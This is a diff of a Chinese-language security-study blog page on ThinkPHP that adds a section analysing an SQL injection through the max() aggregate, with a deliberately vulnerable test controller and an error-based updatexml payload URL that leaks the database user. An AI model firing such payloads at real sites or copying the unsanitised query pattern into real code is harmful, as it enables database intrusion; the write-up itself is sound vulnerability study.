@@ -22,12 +22,12 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="Thinkphp5.0.15参考链接：https:&#x2F;&#x2F;github.com&#x2F;lu2ker&#x2F;PHP-Code">
+  <meta name="description" content="Thinkphp参考链接：https:&#x2F;&#x2F;github.com&#x2F;lu2ker&#x2F;PHP-Code">
 <meta property="og:type" content="article">
-<meta property="og:title" content="漏洞学习4">
+<meta property="og:title" content="Thinkphp">
 <meta property="og:url" content="http://example.com/post/96d74354.html">
 <meta property="og:site_name" content="BeautyFlower">
-<meta property="og:description" content="Thinkphp5.0.15参考链接：https:&#x2F;&#x2F;github.com&#x2F;lu2ker&#x2F;PHP-Code">
+<meta property="og:description" content="Thinkphp参考链接：https:&#x2F;&#x2F;github.com&#x2F;lu2ker&#x2F;PHP-Code">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/post/96d74354/image-20240304140856119.png">
 <meta property="og:image" content="http://example.com/post/96d74354/image-20240304141537693.png">
@@ -72,8 +72,14 @@
 <meta property="og:image" content="http://example.com/post/96d74354/image-20240304211843131.png">
 <meta property="og:image" content="http://example.com/post/96d74354/image-20240304212627585.png">
 <meta property="og:image" content="http://example.com/post/96d74354/image-20240304212908802.png">
+<meta property="og:image" content="http://example.com/post/96d74354/image-20240304214040554.png">
+<meta property="og:image" content="http://example.com/post/96d74354/image-20240304214344276.png">
+<meta property="og:image" content="http://example.com/post/96d74354/image-20240304214510340.png">
+<meta property="og:image" content="http://example.com/post/96d74354/image-20240304214751014.png">
+<meta property="og:image" content="http://example.com/post/96d74354/image-20240304215043886.png">
+<meta property="og:image" content="http://example.com/post/96d74354/image-20240304215326838.png">
 <meta property="article:published_time" content="2024-03-03T06:10:23.000Z">
-<meta property="article:modified_time" content="2024-03-04T13:34:52.985Z">
+<meta property="article:modified_time" content="2024-03-04T13:58:33.852Z">
 <meta property="article:author" content="yyyyyyxnp">
 <meta property="article:tag" content="php">
 <meta name="twitter:card" content="summary">
@@ -92,7 +98,7 @@
   };
 </script>
 
-  <title>漏洞学习4 | BeautyFlower</title>
+  <title>Thinkphp | BeautyFlower</title>
   
 
 
@@ -259,7 +265,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          漏洞学习4
+          Thinkphp
         </h1>
 
         <div class="post-meta">
@@ -276,7 +282,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-03-04 21:34:52" itemprop="dateModified" datetime="2024-03-04T21:34:52+08:00">2024-03-04</time>
+                <time title="Modified: 2024-03-04 21:58:33" itemprop="dateModified" datetime="2024-03-04T21:58:33+08:00">2024-03-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -299,7 +305,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="Thinkphp5-0-15"><a href="#Thinkphp5-0-15" class="headerlink" title="Thinkphp5.0.15"></a>Thinkphp5.0.15</h4><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/lu2ker/PHP-Code">https://github.com/lu2ker/PHP-Code</a></p>
+        <h4 id="Thinkphp"><a href="#Thinkphp" class="headerlink" title="Thinkphp"></a>Thinkphp</h4><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/lu2ker/PHP-Code">https://github.com/lu2ker/PHP-Code</a></p>
 <span id="more"></span>
 
 <h5 id="可能被利用的函数"><a href="#可能被利用的函数" class="headerlink" title="可能被利用的函数"></a>可能被利用的函数</h5><h6 id="array-search"><a href="#array-search" class="headerlink" title="array_search()"></a>array_search()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_search</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> , <span class="keyword">bool</span> <span class="variable">$strict</span>=<span class="literal">false</span> ) <span class="comment"># 在数组中搜索给定值，如果成功则返回第一个对应的键。</span></span><br></pre></td></tr></table></figure>
@@ -518,13 +524,42 @@
 <img src="/post/96d74354/image-20240304211843131.png" alt="image-20240304211843131" style="zoom: 50%;">
 
 <p>如下是根据payload生成的order参数</p>
-<p><img src="/post/96d74354/image-20240304212627585.png" alt="image-20240304212627585"></p>
+<img src="/post/96d74354/image-20240304212627585.png" alt="image-20240304212627585" style="zoom:25%;">
+
 <p>生成的sql语句为</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">WHERE</span>  `username` <span class="operator">=</span> :where_AND_username <span class="keyword">ORDER</span> <span class="keyword">BY</span> `id`<span class="operator">|</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)#` LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure>
 
 <p>最终效果</p>
 <img src="/post/96d74354/image-20240304212908802.png" alt="image-20240304212908802" style="zoom:33%;">
 
+<h5 id="sql6"><a href="#sql6" class="headerlink" title="sql6"></a>sql6</h5><h6 id="环境-5"><a href="#环境-5" class="headerlink" title="环境"></a>环境</h6><p>沿用上文环境</p>
+<h6 id="测试代码-5"><a href="#测试代码-5" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$options</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">max</span>(<span class="variable">$options</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1)%20from%20users%23</span><br></pre></td></tr></table></figure>
+
+<h6 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h6><p>第一行代码还是一样，直接看获取到的options参数</p>
+<img src="/post/96d74354/image-20240304214040554.png" alt="image-20240304214040554" style="zoom:33%;">
+
+<p>进入max函数查看代码执行流程，max函数中只调用了aggregate方法，而aggregate方法中又调用了connection的aggregate方法</p>
+<img src="/post/96d74354/image-20240304214344276.png" alt="image-20240304214344276" style="zoom: 33%;">
+
+<p>在该函数中重新构造了field</p>
+<img src="/post/96d74354/image-20240304214510340.png" alt="image-20240304214510340" style="zoom:33%;">
+
+<p>接着进入value函数，value函数中的该部分会将field转换为字符串数组形式</p>
+<img src="/post/96d74354/image-20240304214751014.png" alt="image-20240304214751014" style="zoom:33%;">
+
+<p>接着设置query的参数</p>
+<img src="/post/96d74354/image-20240304215043886.png" alt="image-20240304215043886" style="zoom: 50%;">
+
+<p>最后的sql语句就是构造的field</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(`id`)<span class="operator">+</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">from</span> users#`) <span class="keyword">AS</span> tp_max <span class="keyword">FROM</span> `users` LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure>
+
+<p>效果如图所示</p>
+<img src="/post/96d74354/image-20240304215326838.png" alt="image-20240304215326838" style="zoom: 33%;">
+
+<h5 id="文件包含7"><a href="#文件包含7" class="headerlink" title="文件包含7"></a>文件包含7</h5>
     </div>
 
     
@@ -534,10 +569,10 @@
   <div class="popular-posts-header">Related Posts</div>
   <ul class="popular-posts">
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\post\b3432909.html" rel="bookmark">sqli-labs</a></div>
+      <div class="popular-posts-title"><a href="\post\7cfe8c25.html" rel="bookmark">pikachu通关</a></div>
     </li>
     <li class="popular-posts-item">
-      <div class="popular-posts-title"><a href="\post\7cfe8c25.html" rel="bookmark">pikachu通关</a></div>
+      <div class="popular-posts-title"><a href="\post\b3432909.html" rel="bookmark">sqli-labs</a></div>
     </li>
     <li class="popular-posts-item">
       <div class="popular-posts-title"><a href="\post\2e50acad.html" rel="bookmark">DedeCMS-5.5.7-sp2</a></div>
@@ -635,7 +670,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Thinkphp5-0-15"><span class="nav-number">1.</span> <span class="nav-text">Thinkphp5.0.15</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">可能被利用的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#array-search"><span class="nav-number">1.1.1.</span> <span class="nav-text">array_search()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#in-array"><span class="nav-number">1.1.2.</span> <span class="nav-text">in_array()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#filter-var"><span class="nav-number">1.1.3.</span> <span class="nav-text">filter_var()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#class-exists"><span class="nav-number">1.1.4.</span> <span class="nav-text">class_exists()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#strpos"><span class="nav-number">1.1.5.</span> <span class="nav-text">strpos()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#escapeshellarg-%E5%92%8Cescapeshellcmd"><span class="nav-number">1.1.6.</span> <span class="nav-text">escapeshellarg()和escapeshellcmd()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85"><span class="nav-number">2.</span> <span class="nav-text">下载安装</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#composer%E5%AE%89%E8%A3%85"><span class="nav-number">2.0.1.</span> <span class="nav-text">composer安装</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql1"><span class="nav-number">2.1.</span> <span class="nav-text">sql1</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">2.1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.1.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql2"><span class="nav-number">2.2.</span> <span class="nav-text">sql2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql3"><span class="nav-number">2.3.</span> <span class="nav-text">sql3</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql4"><span class="nav-number">2.4.</span> <span class="nav-text">sql4</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">2.4.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql5"><span class="nav-number">2.5.</span> <span class="nav-text">sql5</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-4"><span class="nav-number">2.5.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-4"><span class="nav-number">2.5.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-4"><span class="nav-number">2.5.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Thinkphp"><span class="nav-number">1.</span> <span class="nav-text">Thinkphp</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E8%A2%AB%E5%88%A9%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.</span> <span class="nav-text">可能被利用的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#array-search"><span class="nav-number">1.1.1.</span> <span class="nav-text">array_search()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#in-array"><span class="nav-number">1.1.2.</span> <span class="nav-text">in_array()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#filter-var"><span class="nav-number">1.1.3.</span> <span class="nav-text">filter_var()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#class-exists"><span class="nav-number">1.1.4.</span> <span class="nav-text">class_exists()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#strpos"><span class="nav-number">1.1.5.</span> <span class="nav-text">strpos()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#escapeshellarg-%E5%92%8Cescapeshellcmd"><span class="nav-number">1.1.6.</span> <span class="nav-text">escapeshellarg()和escapeshellcmd()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85"><span class="nav-number">2.</span> <span class="nav-text">下载安装</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#composer%E5%AE%89%E8%A3%85"><span class="nav-number">2.0.1.</span> <span class="nav-text">composer安装</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql1"><span class="nav-number">2.1.</span> <span class="nav-text">sql1</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">2.1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-number">2.1.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">2.1.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql2"><span class="nav-number">2.2.</span> <span class="nav-text">sql2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql3"><span class="nav-number">2.3.</span> <span class="nav-text">sql3</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql4"><span class="nav-number">2.4.</span> <span class="nav-text">sql4</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">2.4.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql5"><span class="nav-number">2.5.</span> <span class="nav-text">sql5</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-4"><span class="nav-number">2.5.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-4"><span class="nav-number">2.5.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-4"><span class="nav-number">2.5.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sql6"><span class="nav-number">2.6.</span> <span class="nav-text">sql6</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83-5"><span class="nav-number">2.6.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81-5"><span class="nav-number">2.6.2.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-5"><span class="nav-number">2.6.3.</span> <span class="nav-text">代码分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7"><span class="nav-number">2.7.</span> <span class="nav-text">文件包含7</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
